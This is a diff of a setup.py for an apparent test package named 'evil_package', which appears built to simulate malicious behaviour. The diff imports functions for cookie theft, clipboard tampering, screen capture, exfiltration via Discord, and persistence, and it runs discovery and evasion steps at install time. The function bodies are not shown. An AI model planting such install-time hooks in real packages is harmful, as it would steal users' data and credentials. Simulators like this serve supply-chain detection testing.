@@ -2,25 +2,23 @@ from setuptools import setup, find_packages
 import platform
 
 
-from tests.discovery import get_os_info
-from tests.evasion import run_evasion_tests
-from tests.collection import clipboard_data_alternation
-from tests.collection import screen_capture
-from tests.collection import steel_cookie_db
-from tests.execution import run_process
-from tests.exfiltration import exfil_discord
-from tests.exfiltration import exfil_textstorage
-from tests.persistense import drop_config_autostart
-from tests.persistense import drop_profile_modification
-from tests.persistense import drop_schtask_autostart
+from evil_package.tests.discovery import get_os_info
+from evil_package.tests.evasion import run_evasion_tests
+from evil_package.tests.collection import clipboard_data_alternation
+from evil_package.tests.collection import screen_capture
+from evil_package.tests.collection import steel_cookie_db
+from evil_package.tests.execution import run_process
+from evil_package.tests.exfiltration import exfil_discord
+from evil_package.tests.exfiltration import exfil_textstorage
+from evil_package.tests.persistense import drop_config_autostart
+from evil_package.tests.persistense import drop_profile_modification
+from evil_package.tests.persistense import drop_schtask_autostart
 
 platform_str = platform.system()  # 'Linux' , 'Darwin' , 'Java' , 'Windows'
 print("Info: evil_package starting to run for platform " + platform_str)
 
-
 # discovery
 username = get_os_info(platform_str)
-
 
 # evasion
 run_evasion_tests(platform_str)
